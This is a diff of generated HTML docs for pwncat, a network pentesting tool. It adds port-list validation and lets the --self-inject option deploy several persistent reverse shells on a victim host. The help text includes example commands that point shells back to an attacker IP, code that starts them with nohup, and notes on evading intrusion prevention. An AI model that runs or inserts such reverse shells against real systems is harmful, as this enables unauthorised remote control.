@@ -4369,6 +4461,11 @@ automatically deploy and background-run an unbreakable
 pwncat reverse shell onto the victim machine which then
 also connects back to you with specified arguments.
 Example: &#39;--self-inject /bin/bash:10.0.0.1:4444&#39;
+It is also possible to launch multiple reverse shells by
+specifying multiple ports.
+Via list:  --self-inject /bin/sh:10.0.0.1:4444,4445,4446
+Via range: --self-inject /bin/sh:10.0.0.1:4444-4446
+Via incr:  --self-inject /bin/sh:10.0.0.1:4444+2
 Note: this is currently an experimental feature and does
 not work on Windows remote hosts yet.
 &#34;&#34;&#34;,
@@ -4376,8 +4473,8 @@ not work on Windows remote hosts yet.
     advanced.add_argument(
         &#34;--script-send&#34;,
         metavar=&#34;file&#34;,
+        type=ArgValidator.type_file_content,
         default=None,
-        type=_args_check_script,
         help=&#34;&#34;&#34;All modes (TCP and UDP):
 A Python scripting engine to define your own custom
 transformer function which will be executed before
@@ -4400,8 +4497,8 @@ file will be called with exec().
     advanced.add_argument(
         &#34;--script-recv&#34;,
         metavar=&#34;file&#34;,
+        type=ArgValidator.type_file_content,
         default=None,
-        type=_args_check_script,
         help=&#34;&#34;&#34;All modes (TCP and UDP):
 A Python scripting engine to define your own custom
 transformer function which will be executed after
@@ -4455,8 +4552,8 @@ disconnected or the connection is unterrupted otherwise.
         &#34;--rebind&#34;,
         metavar=&#34;x&#34;,
         nargs=&#34;?&#34;,
-        default=0,
         type=int,
+        default=0,
         help=&#34;&#34;&#34;Listen mode (TCP and UDP):
 If the server is unable to bind, it will re-initialize
 itself x many times before giving up. Omit the
@@ -4470,8 +4567,8 @@ See --rebind-robin for an interesting use-case.
     advanced.add_argument(
         &#34;--rebind-wait&#34;,
         metavar=&#34;s&#34;,
-        default=1.0,
         type=float,
+        default=1.0,
         help=&#34;&#34;&#34;Listen mode (TCP and UDP):
 Wait x seconds between re-initialization. (default: 1)
 
@@ -4480,13 +4577,14 @@ Wait x seconds between re-initialization. (default: 1)
     advanced.add_argument(
         &#34;--rebind-robin&#34;,
         metavar=&#34;port&#34;,
+        type=ArgValidator.type_port_list,
         default=[],
-        type=_args_check_robin_ports,
         help=&#34;&#34;&#34;Listen mode (TCP and UDP):
 If the server is unable to initialize (e.g: cannot bind
 and --rebind is specified, it it will shuffle ports in
-round-robin mode to bind to. Use comma separated string
-such as &#39;80,81,82&#39; or a range of ports &#39;80-100&#39;.
+round-robin mode to bind to.
+Use comma separated string such as &#39;80,81,82,83&#39;, a range
+of ports &#39;80-83&#39; or an increment &#39;80+3&#39;.
 Set --rebind to at least the number of ports to probe +1
 This option requires --rebind to be specified.
 
@@ -4496,6 +4594,7 @@ This option requires --rebind to be specified.
         &#34;--reconn&#34;,
         metavar=&#34;x&#34;,
         nargs=&#34;?&#34;,
+        type=int,
         default=0,
         help=&#34;&#34;&#34;Connect mode / Zero-I/O mode (TCP only):
 If the remote server is not reachable or the connection
@@ -4512,8 +4611,8 @@ This might be handy for stable TCP reverse shells ;-)
     advanced.add_argument(
         &#34;--reconn-wait&#34;,
         metavar=&#34;s&#34;,
-        default=1.0,
         type=float,
+        default=1.0,
         help=&#34;&#34;&#34;Connect mode / Zero-I/O mode (TCP only):
 Wait x seconds between re-connects. (default: 1)
 
@@ -4522,14 +4621,14 @@ Wait x seconds between re-connects. (default: 1)
     advanced.add_argument(
         &#34;--reconn-robin&#34;,
         metavar=&#34;port&#34;,
+        type=ArgValidator.type_port_list,
         default=[],
-        type=_args_check_robin_ports,
         help=&#34;&#34;&#34;Connect mode / Zero-I/O mode (TCP only):
 If the remote server is not reachable or the connection
 is interrupted and --reconn is specified, the client
 will shuffle ports in round-robin mode to connect to.
-Use comma separated string such as &#39;80,81,82&#39; or a range
-of ports &#39;80-100&#39;.
+Use comma separated string such as &#39;80,81,82,83&#39;, a range
+of ports &#39;80-83&#39; or an increment &#39;80+3&#39;.
 Set --reconn to at least the number of ports to probe +1
 This helps reverse shell to evade intrusiona prevention
 systems that will cut your connection and block the
@@ -4543,8 +4642,8 @@ figure out what outbound ports are allowed.
         &#34;-w&#34;,
         &#34;--wait&#34;,
         metavar=&#34;s&#34;,
-        default=False,
         type=int,
+        default=False,
         help=&#34;&#34;&#34;Connect mode (TCP only):
 If a connection and stdin are idle for more than s sec,
 then the connection is silently closed and the client
@@ -4580,8 +4679,8 @@ ping packet (default: &#39;\\0&#39;)
     advanced.add_argument(
         &#34;--ping-intvl&#34;,
         metavar=&#34;s&#34;,
-        default=False,
         type=int,
+        default=False,
         help=&#34;&#34;&#34;Connect mode / Zero-I/O mode (TCP and UDP):
 Instruct the client to send ping intervalls every s sec.
 This allows you to restart your UDP server and just wait
@@ -4595,8 +4694,8 @@ ping packet (default: &#39;\\0&#39;)
     advanced.add_argument(
         &#34;--ping-word&#34;,
         metavar=&#34;str&#34;,
-        default=&#34;\0&#34;,
         type=str,
+        default=&#34;\0&#34;,
         help=&#34;&#34;&#34;Connect mode / Zero-I/O mode (TCP and UDP):
 Change the default character &#39;\\0&#39; to use for upd ping.
 Single character or strings are supported.
@@ -4606,12 +4705,14 @@ Single character or strings are supported.
     advanced.add_argument(
         &#34;--ping-robin&#34;,
         metavar=&#34;port&#34;,
+        type=ArgValidator.type_port_list,
         default=[],
-        type=_args_check_robin_ports,
         help=&#34;&#34;&#34;Connect mode / Zero-I/O mode (TCP and UDP):
 Instruct the client to shuffle the specified ports in
 round-robin mode for a remote server to ping.
 This might be handy to scan outbound allowed ports.
+Use comma separated string such as &#39;80,81,82,83&#39;, a range
+of ports &#39;80-83&#39; or an increment &#39;80+3&#39;.
 Use --ping-intvl 0 to be faster.
 
 &#34;&#34;&#34;,
@@ -4619,8 +4720,8 @@ Use --ping-intvl 0 to be faster.
     advanced.add_argument(
         &#34;--safe-word&#34;,
         metavar=&#34;str&#34;,
-        default=False,
         type=str,
+        default=False,
         help=&#34;&#34;&#34;All modes:
 If %(prog)s is started with this argument, it will shut
 down as soon as it receives the specified string. The
@@ -4847,7 +4948,8 @@ accidentally by other input.
         # This will hand over to normal listening server on success or failure
         if args.self_inject:
             cnc_cmd, cnc_host, cnc_port = args.self_inject.split(&#34;:&#34;)
-            CNCAutoDeploy(enc, net.consumer, net.producer, cnc_cmd, cnc_host, cnc_port)
+            cnc_ports = ArgValidator.get_port_list_from_string(cnc_port)
+            CNCAutoDeploy(enc, net.consumer, net.producer, cnc_cmd, cnc_host, cnc_ports)
         run = Runner(PSEStore(ssig, [net]))
         run.add_action(
             &#34;RECV&#34;,
@@ -4910,6 +5012,481 @@ accidentally by other input.
 <section>
 <h2 class="section-title" id="header-classes">Classes</h2>
 <dl>
+<dt id="pwncat.ArgValidator"><code class="flex name class">
+<span>class <span class="ident">ArgValidator</span></span>
+</code></dt>
+<dd>
+<div class="desc"><p>Validate command line arguments.</p></div>
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">class ArgValidator(object):
+    &#34;&#34;&#34;Validate command line arguments.&#34;&#34;&#34;
+
+    # --------------------------------------------------------------------------
+    # Private Functions
+    # --------------------------------------------------------------------------
+    @staticmethod
+    def __get_port_list_by_comma(value):
+        # type: (str) -&gt; List[int]
+        &#34;&#34;&#34;Returns a list of ports from a comma separated string or empty list if invalid.&#34;&#34;&#34;
+        ports = []
+        match = re.search(r&#34;^[0-9]+(,([0-9]+))*$&#34;, value)
+        if match is not None:
+            ports = [int(port) for port in match.group(0).split(&#34;,&#34;)]
+            for port in ports:
+                if not ArgValidator.is_valid_port(port):
+                    return []
+        return ports
+
+    @staticmethod
+    def __get_port_list_by_range(value):
+        # type: (str) -&gt; List[int]
+        &#34;&#34;&#34;Returns a list of ports from a range string or empty list if invalid.&#34;&#34;&#34;
+        ports = []  # type: List[int]
+        match = re.search(r&#34;^[0-9]+\-[0-9]+$&#34;, value)
+        if match is not None:
+            ranges = [int(r) for r in match.group(0).split(&#34;-&#34;)]
+            ports = list(range(ranges[0], ranges[1] + 1))
+            for port in ports:
+                if not ArgValidator.is_valid_port(port):
+                    return []
+        return ports
+
+    @staticmethod
+    def __get_port_list_by_incr(value):
+        # type: (str) -&gt; List[int]
+        &#34;&#34;&#34;Returns a list of ports from an increment or empty list if invalid.&#34;&#34;&#34;
+        ports = []  # type: List[int]
+        match = re.search(r&#34;^[0-9]+\+[0-9]+$&#34;, value)
+        if match is not None:
+            ranges = [int(r) for r in match.group(0).split(&#34;+&#34;)]
+            ports = list(range(ranges[0], ranges[0] + ranges[1] + 1))
+            for port in ports:
+                if not ArgValidator.is_valid_port(port):
+                    return []
+        return ports
+
+    # --------------------------------------------------------------------------
+    # Helper Functions
+    # --------------------------------------------------------------------------
+    @staticmethod
+    def is_valid_port(value):
+        # type: (int) -&gt; bool
+        &#34;&#34;&#34;Returns True if a given value is a valid port.&#34;&#34;&#34;
+        return 0 &lt; value &lt; 65536
+
+    @staticmethod
+    def is_valid_port_list(value):
+        # type: (str) -&gt; bool
+        &#34;&#34;&#34;Returns True if a given value is a valid port list by comma or range.&#34;&#34;&#34;
+        cports = ArgValidator.__get_port_list_by_comma(value)
+        rports = ArgValidator.__get_port_list_by_range(value)
+        iports = ArgValidator.__get_port_list_by_incr(value)
+        # XOR - only one method (comma, range or increment) is allowed
+        if cports and not rports and not iports:
+            return True
+        if rports and not cports and not iports:
+            return True
+        if iports and not cports and not rports:
+            return True
+        return False
+
+    @staticmethod
+    def get_port_list_from_string(value):
+        # type: (str) -&gt; List[int]
+        &#34;&#34;&#34;Returns a list of ports from an comma, range or increment.&#34;&#34;&#34;
+        cports = ArgValidator.__get_port_list_by_comma(value)
+        rports = ArgValidator.__get_port_list_by_range(value)
+        iports = ArgValidator.__get_port_list_by_incr(value)
+        return cports + rports + iports
+
+    # --------------------------------------------------------------------------
+    # Generic Type Functions
+    # --------------------------------------------------------------------------
+    @staticmethod
+    def type_port(value):
+        # type: (str) -&gt; int
+        &#34;&#34;&#34;Check argument for valid port.&#34;&#34;&#34;
+        if not ArgValidator.is_valid_port(int(value)):
+            raise argparse.ArgumentTypeError(&#34;%s is an invalid port number.&#34; % value)
+        return int(value)
+
+    @staticmethod
+    def type_port_list(value):
+        # type: (str) -&gt; List[int]
+        &#34;&#34;&#34;Check argument for valid port list separated by comma or range number.&#34;&#34;&#34;
+        rports = ArgValidator.__get_port_list_by_range(value)
+        cports = ArgValidator.__get_port_list_by_comma(value)
+        iports = ArgValidator.__get_port_list_by_incr(value)
+
+        # Only use comma, range or increment!
+        if (rports and cports) or (rports and iports) or (cports and iports):
+            raise argparse.ArgumentTypeError(
+                &#34;%s is invalid. Can only use comma, range or increment.&#34; % value
+            )
+        if not rports and not cports and not iports:
+            raise argparse.ArgumentTypeError(&#34;%s is an invalid port-list/range definition.&#34; % value)
+        # Return whichever has a value
+        return rports + cports + iports
+
+    @staticmethod
+    def type_file_content(value):
+        # type: (str) -&gt; str
+        &#34;&#34;&#34;Check argument for valid file content (file must exist and be readable).&#34;&#34;&#34;
+        if not os.path.isfile(value):
+            raise argparse.ArgumentTypeError(&#34;File not found: %s&#34; % value)
+        fhandle = open(value, mode=&#34;r&#34;)
+        script = fhandle.read()
+        fhandle.close()
+        return script
+
+    # --------------------------------------------------------------------------
+    # Specific Type Functions
+    # --------------------------------------------------------------------------
+    @staticmethod
+    def type_tos(value):
+        # type: (str) -&gt; str
+        &#34;&#34;&#34;Check argument for valid --tos value.&#34;&#34;&#34;
+        if value not in [&#34;mincost&#34;, &#34;lowcost&#34;, &#34;reliability&#34;, &#34;throughput&#34;, &#34;lowdelay&#34;]:
+            raise argparse.ArgumentTypeError(&#34;%s is an invalid tos definition.&#34; % value)
+        return value
+
+    @staticmethod
+    def type_info(value):
+        # type: (str) -&gt; str
+        &#34;&#34;&#34;Check argument for valid --info value.&#34;&#34;&#34;
+        if value not in [&#34;sock&#34;, &#34;ipv4&#34;, &#34;ipv6&#34;, &#34;tcp&#34;, &#34;all&#34;, &#34;&#34;]:
+            raise argparse.ArgumentTypeError(&#34;%s is an invalid info definition.&#34; % value)
+        return value
+
+    @staticmethod
+    def type_crlf(value):
+        # type: (Optional[str]) -&gt; Optional[str]
+        &#34;&#34;&#34;Check argument for valid --crlf value.&#34;&#34;&#34;
+        if value is None:
+            return None
+        if value.lower() in [&#34;crlf&#34;, &#34;lf&#34;, &#34;cr&#34;, &#34;no&#34;]:
+            return value.lower()
+        raise argparse.ArgumentTypeError(&#34;&#39;%s&#39; is an invalid choice.&#34; % value)
+
+    @staticmethod
+    def type_color(value):
+        # type: (str) -&gt; str
+        &#34;&#34;&#34;Check argument for valid --color value.&#34;&#34;&#34;
+        if value not in [&#34;auto&#34;, &#34;always&#34;, &#34;never&#34;]:
+            raise argparse.ArgumentTypeError(&#34;%s is an invalid color definition.&#34; % value)
+        return value
+
+    @staticmethod
+    def type_local(value):
+        # type: (str) -&gt; str
+        &#34;&#34;&#34;Check argument for valid -L/--local value.&#34;&#34;&#34;
+        match = re.search(r&#34;^(.+:)?([0-9]+)$&#34;, value)
+        if match is None or len(match.groups()) != 2:
+            raise argparse.ArgumentTypeError(&#34;%s is not a valid &#39;[addr:]port&#39; format.&#34; % value)
+        if not ArgValidator.is_valid_port(int(match.group(2))):
+            raise argparse.ArgumentTypeError(&#34;%s is not a valid port.&#34; % value)
+
+        if match.group(1) is None:
+            return &#34;:&#34; + match.group(2)
+        return value
+
+    @staticmethod
+    def type_remote(value):
+        # type: (str) -&gt; str
+        &#34;&#34;&#34;Check argument for valid -R/--remote value.&#34;&#34;&#34;
+        match = re.search(r&#34;(.+):(.+)&#34;, value)
+        if match is None or len(match.groups()) != 2:
+            raise argparse.ArgumentTypeError(&#34;%s is not a valid &#39;addr:port&#39; format.&#34; % value)
+        if not ArgValidator.is_valid_port(int(match.group(2))):
+            raise argparse.ArgumentTypeError(&#34;%s is not a valid port.&#34; % value)
+        return value
+
+    @staticmethod
+    def type_self_inject(value):
+        # type: (str) -&gt; str
+        &#34;&#34;&#34;Check argument for valid --self-inject value.&#34;&#34;&#34;
+        opts = value.split(&#34;:&#34;)
+        if len(opts) != 3:
+            raise argparse.ArgumentTypeError(&#34;%s is not a valid cmd:host:port[s] pattern.&#34; % value)
+        if not ArgValidator.is_valid_port_list(opts[-1]):
+            raise argparse.ArgumentTypeError(&#34;%s is an invalid port definition.&#34; % value)
+        return value</code></pre>
+</details>
+<h3>Static methods</h3>
+<dl>
+<dt id="pwncat.ArgValidator.get_port_list_from_string"><code class="name flex">
+<span>def <span class="ident">get_port_list_from_string</span></span>(<span>value)</span>
+</code></dt>
+<dd>
+<div class="desc"><p>Returns a list of ports from an comma, range or increment.</p></div>
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">@staticmethod
+def get_port_list_from_string(value):
+    # type: (str) -&gt; List[int]
+    &#34;&#34;&#34;Returns a list of ports from an comma, range or increment.&#34;&#34;&#34;
+    cports = ArgValidator.__get_port_list_by_comma(value)
+    rports = ArgValidator.__get_port_list_by_range(value)
+    iports = ArgValidator.__get_port_list_by_incr(value)
+    return cports + rports + iports</code></pre>
+</details>
+</dd>
+<dt id="pwncat.ArgValidator.is_valid_port"><code class="name flex">
+<span>def <span class="ident">is_valid_port</span></span>(<span>value)</span>
+</code></dt>
+<dd>
+<div class="desc"><p>Returns True if a given value is a valid port.</p></div>
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">@staticmethod
+def is_valid_port(value):
+    # type: (int) -&gt; bool
+    &#34;&#34;&#34;Returns True if a given value is a valid port.&#34;&#34;&#34;
+    return 0 &lt; value &lt; 65536</code></pre>
+</details>
+</dd>
+<dt id="pwncat.ArgValidator.is_valid_port_list"><code class="name flex">
+<span>def <span class="ident">is_valid_port_list</span></span>(<span>value)</span>
+</code></dt>
+<dd>
+<div class="desc"><p>Returns True if a given value is a valid port list by comma or range.</p></div>
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">@staticmethod
+def is_valid_port_list(value):
+    # type: (str) -&gt; bool
+    &#34;&#34;&#34;Returns True if a given value is a valid port list by comma or range.&#34;&#34;&#34;
+    cports = ArgValidator.__get_port_list_by_comma(value)
+    rports = ArgValidator.__get_port_list_by_range(value)
+    iports = ArgValidator.__get_port_list_by_incr(value)
+    # XOR - only one method (comma, range or increment) is allowed
+    if cports and not rports and not iports:
+        return True
+    if rports and not cports and not iports:
+        return True
+    if iports and not cports and not rports:
+        return True
+    return False</code></pre>
+</details>
+</dd>
+<dt id="pwncat.ArgValidator.type_color"><code class="name flex">
+<span>def <span class="ident">type_color</span></span>(<span>value)</span>
+</code></dt>
+<dd>
+<div class="desc"><p>Check argument for valid &ndash;color value.</p></div>
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">@staticmethod
+def type_color(value):
+    # type: (str) -&gt; str
+    &#34;&#34;&#34;Check argument for valid --color value.&#34;&#34;&#34;
+    if value not in [&#34;auto&#34;, &#34;always&#34;, &#34;never&#34;]:
+        raise argparse.ArgumentTypeError(&#34;%s is an invalid color definition.&#34; % value)
+    return value</code></pre>
+</details>
+</dd>
+<dt id="pwncat.ArgValidator.type_crlf"><code class="name flex">
+<span>def <span class="ident">type_crlf</span></span>(<span>value)</span>
+</code></dt>
+<dd>
+<div class="desc"><p>Check argument for valid &ndash;crlf value.</p></div>
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">@staticmethod
+def type_crlf(value):
+    # type: (Optional[str]) -&gt; Optional[str]
+    &#34;&#34;&#34;Check argument for valid --crlf value.&#34;&#34;&#34;
+    if value is None:
+        return None
+    if value.lower() in [&#34;crlf&#34;, &#34;lf&#34;, &#34;cr&#34;, &#34;no&#34;]:
+        return value.lower()
+    raise argparse.ArgumentTypeError(&#34;&#39;%s&#39; is an invalid choice.&#34; % value)</code></pre>
+</details>
+</dd>
+<dt id="pwncat.ArgValidator.type_file_content"><code class="name flex">
+<span>def <span class="ident">type_file_content</span></span>(<span>value)</span>
+</code></dt>
+<dd>
+<div class="desc"><p>Check argument for valid file content (file must exist and be readable).</p></div>
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">@staticmethod
+def type_file_content(value):
+    # type: (str) -&gt; str
+    &#34;&#34;&#34;Check argument for valid file content (file must exist and be readable).&#34;&#34;&#34;
+    if not os.path.isfile(value):
+        raise argparse.ArgumentTypeError(&#34;File not found: %s&#34; % value)
+    fhandle = open(value, mode=&#34;r&#34;)
+    script = fhandle.read()
+    fhandle.close()
+    return script</code></pre>
+</details>
+</dd>
+<dt id="pwncat.ArgValidator.type_info"><code class="name flex">
+<span>def <span class="ident">type_info</span></span>(<span>value)</span>
+</code></dt>
+<dd>
+<div class="desc"><p>Check argument for valid &ndash;info value.</p></div>
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">@staticmethod
+def type_info(value):
+    # type: (str) -&gt; str
+    &#34;&#34;&#34;Check argument for valid --info value.&#34;&#34;&#34;
+    if value not in [&#34;sock&#34;, &#34;ipv4&#34;, &#34;ipv6&#34;, &#34;tcp&#34;, &#34;all&#34;, &#34;&#34;]:
+        raise argparse.ArgumentTypeError(&#34;%s is an invalid info definition.&#34; % value)
+    return value</code></pre>
+</details>
+</dd>
+<dt id="pwncat.ArgValidator.type_local"><code class="name flex">
+<span>def <span class="ident">type_local</span></span>(<span>value)</span>
+</code></dt>
+<dd>
+<div class="desc"><p>Check argument for valid -L/&ndash;local value.</p></div>
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">@staticmethod
+def type_local(value):
+    # type: (str) -&gt; str
+    &#34;&#34;&#34;Check argument for valid -L/--local value.&#34;&#34;&#34;
+    match = re.search(r&#34;^(.+:)?([0-9]+)$&#34;, value)
+    if match is None or len(match.groups()) != 2:
+        raise argparse.ArgumentTypeError(&#34;%s is not a valid &#39;[addr:]port&#39; format.&#34; % value)
+    if not ArgValidator.is_valid_port(int(match.group(2))):
+        raise argparse.ArgumentTypeError(&#34;%s is not a valid port.&#34; % value)
+
+    if match.group(1) is None:
+        return &#34;:&#34; + match.group(2)
+    return value</code></pre>
+</details>
+</dd>
+<dt id="pwncat.ArgValidator.type_port"><code class="name flex">
+<span>def <span class="ident">type_port</span></span>(<span>value)</span>
+</code></dt>
+<dd>
+<div class="desc"><p>Check argument for valid port.</p></div>
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">@staticmethod
+def type_port(value):
+    # type: (str) -&gt; int
+    &#34;&#34;&#34;Check argument for valid port.&#34;&#34;&#34;
+    if not ArgValidator.is_valid_port(int(value)):
+        raise argparse.ArgumentTypeError(&#34;%s is an invalid port number.&#34; % value)
+    return int(value)</code></pre>
+</details>
+</dd>
+<dt id="pwncat.ArgValidator.type_port_list"><code class="name flex">
+<span>def <span class="ident">type_port_list</span></span>(<span>value)</span>
+</code></dt>
+<dd>
+<div class="desc"><p>Check argument for valid port list separated by comma or range number.</p></div>
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">@staticmethod
+def type_port_list(value):
+    # type: (str) -&gt; List[int]
+    &#34;&#34;&#34;Check argument for valid port list separated by comma or range number.&#34;&#34;&#34;
+    rports = ArgValidator.__get_port_list_by_range(value)
+    cports = ArgValidator.__get_port_list_by_comma(value)
+    iports = ArgValidator.__get_port_list_by_incr(value)
+
+    # Only use comma, range or increment!
+    if (rports and cports) or (rports and iports) or (cports and iports):
+        raise argparse.ArgumentTypeError(
+            &#34;%s is invalid. Can only use comma, range or increment.&#34; % value
+        )
+    if not rports and not cports and not iports:
+        raise argparse.ArgumentTypeError(&#34;%s is an invalid port-list/range definition.&#34; % value)
+    # Return whichever has a value
+    return rports + cports + iports</code></pre>
+</details>
+</dd>
+<dt id="pwncat.ArgValidator.type_remote"><code class="name flex">
+<span>def <span class="ident">type_remote</span></span>(<span>value)</span>
+</code></dt>
+<dd>
+<div class="desc"><p>Check argument for valid -R/&ndash;remote value.</p></div>
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">@staticmethod
+def type_remote(value):
+    # type: (str) -&gt; str
+    &#34;&#34;&#34;Check argument for valid -R/--remote value.&#34;&#34;&#34;
+    match = re.search(r&#34;(.+):(.+)&#34;, value)
+    if match is None or len(match.groups()) != 2:
+        raise argparse.ArgumentTypeError(&#34;%s is not a valid &#39;addr:port&#39; format.&#34; % value)
+    if not ArgValidator.is_valid_port(int(match.group(2))):
+        raise argparse.ArgumentTypeError(&#34;%s is not a valid port.&#34; % value)
+    return value</code></pre>
+</details>
+</dd>
+<dt id="pwncat.ArgValidator.type_self_inject"><code class="name flex">
+<span>def <span class="ident">type_self_inject</span></span>(<span>value)</span>
+</code></dt>
+<dd>
+<div class="desc"><p>Check argument for valid &ndash;self-inject value.</p></div>
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">@staticmethod
+def type_self_inject(value):
+    # type: (str) -&gt; str
+    &#34;&#34;&#34;Check argument for valid --self-inject value.&#34;&#34;&#34;
+    opts = value.split(&#34;:&#34;)
+    if len(opts) != 3:
+        raise argparse.ArgumentTypeError(&#34;%s is not a valid cmd:host:port[s] pattern.&#34; % value)
+    if not ArgValidator.is_valid_port_list(opts[-1]):
+        raise argparse.ArgumentTypeError(&#34;%s is an invalid port definition.&#34; % value)
+    return value</code></pre>
+</details>
+</dd>
+<dt id="pwncat.ArgValidator.type_tos"><code class="name flex">
+<span>def <span class="ident">type_tos</span></span>(<span>value)</span>
+</code></dt>
+<dd>
+<div class="desc"><p>Check argument for valid &ndash;tos value.</p></div>
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">@staticmethod
+def type_tos(value):
+    # type: (str) -&gt; str
+    &#34;&#34;&#34;Check argument for valid --tos value.&#34;&#34;&#34;
+    if value not in [&#34;mincost&#34;, &#34;lowcost&#34;, &#34;reliability&#34;, &#34;throughput&#34;, &#34;lowdelay&#34;]:
+        raise argparse.ArgumentTypeError(&#34;%s is an invalid tos definition.&#34; % value)
+    return value</code></pre>
+</details>
+</dd>
+</dl>
+</dd>
 <dt id="pwncat.CNC"><code class="flex name class">
 <span>class <span class="ident">CNC</span></span>
 <span>(</span><span>enc, fsend, frecv)</span>
@@ -5397,7 +5974,7 @@ def python(self):
 </dd>
 <dt id="pwncat.CNCAutoDeploy"><code class="flex name class">
 <span>class <span class="ident">CNCAutoDeploy</span></span>
-<span>(</span><span>enc, send, recv, cmd, host, port)</span>
+<span>(</span><span>enc, send, recv, cmd, host, ports)</span>
 </code></dt>
 <dd>
 <div class="desc"><p>Command&amp;Control pwncat auto deployment class.</p>
@@ -5430,7 +6007,7 @@ def python(self):
         recv,  # type: Callable[[], Iterator[str]]
         cmd,  # type: str
         host,  # type: str
-        port,  # type: str
+        ports,  # type: List[int]
     ):
         # type: (...) -&gt; None
         try:
@@ -5445,24 +6022,25 @@ def python(self):
         if not self.upload(local_path, remote_path):
             return
         # TODO: Ensure pwncat stays running
-        self.__start_pwncat(remote_path, cmd, host, port)
+        self.__start_pwncat(remote_path, cmd, host, ports)
         return
 
-    def __start_pwncat(self, remote_path, binary, host, port):
-        # type: (str, str, str, str) -&gt; None
-        command = []
-        command.append(&#34;nohup&#34;)
-        command.append(self.python)
-        command.append(remote_path)
-        command.append(&#34;--exec {}&#34;.format(binary))
-        command.append(&#34;--reconn&#34;)
-        command.append(&#34;--reconn-wait 1&#34;)
-        command.append(host)
-        command.append(port)
-        command.append(&#34;&amp;&#34;)
-        data = &#34; &#34;.join(command)
-        print(&#34;Starting pwncat rev shell: {}&#34;.format(data))
-        self.remote_command(data)</code></pre>
+    def __start_pwncat(self, remote_path, binary, host, ports):
+        # type: (str, str, str, List[int]) -&gt; None
+        for port in ports:
+            command = []
+            command.append(&#34;nohup&#34;)
+            command.append(self.python)
+            command.append(remote_path)
+            command.append(host)
+            command.append(str(port))
+            command.append(&#34;--exec {}&#34;.format(binary))
+            command.append(&#34;--reconn&#34;)
+            command.append(&#34;--reconn-wait 1&#34;)
+            command.append(&#34;&amp;&#34;)
+            data = &#34; &#34;.join(command)
+            print(&#34;Starting pwncat rev shell: {}&#34;.format(data))
+            self.remote_command(data)</code></pre>
 </details>
 <h3>Ancestors</h3>
 <ul class="hlist">
@@ -9132,7 +9710,9 @@ def store(self):
             infos = socket.getaddrinfo(host, port, family, socktype, proto, flags)
             addr = str(infos[0][4][0])
         except (AttributeError, socket.gaierror) as error:
-            raise socket.gaierror(error)  # type: ignore
+            msg = &#34;Resolving hostname: {} failed: {}&#34;.format(str(host), str(error))
+            self.__log.trace(msg)  # type: ignore
+            raise socket.gaierror(msg)  # type: ignore
         self.__log.debug(&#34;Resolved hostname: %s&#34;, addr)
         return addr
 
@@ -10549,6 +11129,24 @@ def transform(self, data):
 </li>
 <li><h3><a href="#header-classes">Classes</a></h3>
 <ul>
+<li>
+<h4><code><a title="pwncat.ArgValidator" href="#pwncat.ArgValidator">ArgValidator</a></code></h4>
+<ul class="">
+<li><code><a title="pwncat.ArgValidator.get_port_list_from_string" href="#pwncat.ArgValidator.get_port_list_from_string">get_port_list_from_string</a></code></li>
+<li><code><a title="pwncat.ArgValidator.is_valid_port" href="#pwncat.ArgValidator.is_valid_port">is_valid_port</a></code></li>
+<li><code><a title="pwncat.ArgValidator.is_valid_port_list" href="#pwncat.ArgValidator.is_valid_port_list">is_valid_port_list</a></code></li>
+<li><code><a title="pwncat.ArgValidator.type_color" href="#pwncat.ArgValidator.type_color">type_color</a></code></li>
+<li><code><a title="pwncat.ArgValidator.type_crlf" href="#pwncat.ArgValidator.type_crlf">type_crlf</a></code></li>
+<li><code><a title="pwncat.ArgValidator.type_file_content" href="#pwncat.ArgValidator.type_file_content">type_file_content</a></code></li>
+<li><code><a title="pwncat.ArgValidator.type_info" href="#pwncat.ArgValidator.type_info">type_info</a></code></li>
+<li><code><a title="pwncat.ArgValidator.type_local" href="#pwncat.ArgValidator.type_local">type_local</a></code></li>
+<li><code><a title="pwncat.ArgValidator.type_port" href="#pwncat.ArgValidator.type_port">type_port</a></code></li>
+<li><code><a title="pwncat.ArgValidator.type_port_list" href="#pwncat.ArgValidator.type_port_list">type_port_list</a></code></li>
+<li><code><a title="pwncat.ArgValidator.type_remote" href="#pwncat.ArgValidator.type_remote">type_remote</a></code></li>
+<li><code><a title="pwncat.ArgValidator.type_self_inject" href="#pwncat.ArgValidator.type_self_inject">type_self_inject</a></code></li>
+<li><code><a title="pwncat.ArgValidator.type_tos" href="#pwncat.ArgValidator.type_tos">type_tos</a></code></li>
+</ul>
+</li>
 <li>
 <h4><code><a title="pwncat.CNC" href="#pwncat.CNC">CNC</a></code></h4>
 <ul class="">
